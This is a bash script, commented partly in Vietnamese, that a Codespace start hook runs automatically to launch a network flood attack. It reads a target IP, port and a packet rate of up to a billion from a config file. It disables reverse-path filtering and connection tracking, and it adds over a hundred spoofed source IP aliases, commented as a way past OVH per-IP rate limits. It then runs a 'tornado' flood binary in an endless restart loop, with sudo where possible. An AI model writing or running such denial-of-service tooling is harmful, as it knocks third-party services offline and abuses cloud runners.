#!/bin/bash
# run_attack.sh — postStartCommand: chạy mỗi lần Codespace start
# NO set -e: binary có thể exit non-zero khi CAP_NET_RAW bị deny

WORKSPACE="$(cd "$(dirname "$0")/.." && pwd)"
cd "$WORKSPACE"

CONFIG="$WORKSPACE/attack_config.json"
BINARY="$WORKSPACE/tornado"
LOGFILE="/tmp/attack.log"

echo "[run_attack] Start at $(date)"

# ── 1. Chờ binary (setup.sh vẫn đang build) ──────────────────────────
for i in $(seq 1 90); do
    if [ -f "$BINARY" ] && [ -x "$BINARY" ]; then
        echo "[run_attack] Binary ready (${i}x2s)"
        break
    fi
    if [ $i -eq 1 ]; then
        echo "[run_attack] Binary missing, trigger build..."
        make minimal -C "$WORKSPACE" >> /tmp/build.log 2>&1 &
    fi
    sleep 2
done

if [ ! -f "$BINARY" ] || [ ! -x "$BINARY" ]; then
    echo "[run_attack] FATAL: binary not found after 180s, exit"
    exit 0
fi

# ── 2. Chờ attack_config.json ─────────────────────────────────────────
for i in $(seq 1 30); do
    [ -f "$CONFIG" ] && break
    echo "[run_attack] Waiting config ($i)..."
    sleep 3
done

if [ ! -f "$CONFIG" ]; then
    echo "[run_attack] No config after 90s — idle"
    sleep infinity
    exit 0
fi

read_cfg() {
    python3 -c "
import json,sys
try:
    d=json.load(open('$CONFIG'))
    print(d.get('$1','$2'))
except:
    print('$2')
" 2>/dev/null || echo "$2"
}

TARGET=$(read_cfg target_ip "")
PORT=$(read_cfg target_port "443")
RATE=$(read_cfg rate "1000000000")
DURATION=$(read_cfg duration "120")
METHOD=$(read_cfg method "v18_tcp")
THREADS=$(read_cfg threads "4")

if [ -z "$TARGET" ]; then
    echo "[run_attack] No target — idle"
    sleep infinity
    exit 0
fi

echo "[run_attack] Target: $TARGET:$PORT method=$METHOD threads=$THREADS dur=${DURATION}s"

# ── 3. Network tuning (ignore errors) ────────────────────────────────
sysctl -w net.core.wmem_max=134217728       2>/dev/null || true
sysctl -w net.core.rmem_max=134217728       2>/dev/null || true
sysctl -w net.core.netdev_max_backlog=50000 2>/dev/null || true
sysctl -w net.ipv4.ip_forward=1            2>/dev/null || true
sysctl -w net.ipv4.conf.all.rp_filter=0    2>/dev/null || true
sysctl -w net.ipv4.conf.default.rp_filter=0 2>/dev/null || true
iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null || true
iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
iptables -A OUTPUT -p tcp --tcp-flags RST RST -d "$TARGET" -j DROP 2>/dev/null || true

# ── 3.5. Add source IP aliases (same subnet as runner) for OVH per-IP rate bypass ──
# Raw socket: proxy không work. Dùng IP aliases trong cùng subnet của runner.
# Router L2 segment sẽ route packets với source IP bất kỳ trong subnet mà không BCP38 drop.
IFACE=$(ip route get 8.8.8.8 2>/dev/null | grep -oP 'dev \K\S+' | head -1)
if [ -n "$IFACE" ]; then
    # Lấy subnet của runner (e.g. 10.1.0.0/24)
    BASE_IP=$(ip -4 addr show dev "$IFACE" 2>/dev/null | grep -oP '(?<=inet )[\d.]+' | head -1)
    PREFIX=$(ip -4 addr show dev "$IFACE" 2>/dev/null | grep -oP '(?<=inet )[\d.]+/\d+' | head -1 | grep -oP '/\K\d+')
    SUBNET=$(echo "$BASE_IP" | cut -d. -f1-3)
    ADDED=0
    if [ -n "$SUBNET" ] && [ -n "$PREFIX" ]; then
        for i in $(seq 2 254); do
            IP_ALIAS="${SUBNET}.${i}"
            # Skip se alias IP trùng với IP thật
            [ "$IP_ALIAS" = "$BASE_IP" ] && continue
            sudo ip addr add "${IP_ALIAS}/${PREFIX}" dev "$IFACE" 2>/dev/null && ADDED=$((ADDED+1)) || true
            [ $ADDED -ge 127 ] && break
        done
        echo "[run_attack] Added $ADDED IP aliases (${SUBNET}.2-$(( ADDED+1 ))) on $IFACE (same subnet)"
    else
        echo "[run_attack] Could not detect subnet, skip aliasing"
    fi
fi


# ── 4. Loop vô hạn — restart ngay kể cả khi binary crash ────────────
ROUND=0
while true; do
    ROUND=$((ROUND+1))

    # Re-read config mỗi round
    TARGET=$(read_cfg target_ip "$TARGET")
    PORT=$(read_cfg target_port "$PORT")
    RATE=$(read_cfg rate "$RATE")
    DURATION=$(read_cfg duration "$DURATION")
    METHOD=$(read_cfg method "$METHOD")
    THREADS=$(read_cfg threads "$THREADS")

    echo "[run_attack] Round $ROUND: $TARGET:$PORT $METHOD $(date)" | tee -a "$LOGFILE"

    # Thử sudo trước, nếu fail thì chạy trực tiếp (không sudo)
    if sudo -n true 2>/dev/null; then
        sudo "$BINARY" "$TARGET" "$PORT" "$RATE" "$DURATION" "$METHOD" "$THREADS" \
            >> "$LOGFILE" 2>&1 || echo "[run_attack] Round $ROUND exit non-zero (ok, restart)"
    else
        "$BINARY" "$TARGET" "$PORT" "$RATE" "$DURATION" "$METHOD" "$THREADS" \
            >> "$LOGFILE" 2>&1 || echo "[run_attack] Round $ROUND exit non-zero (ok, restart)"
    fi

    echo "[run_attack] Round $ROUND done, restart in 1s..."
    sleep 1
done
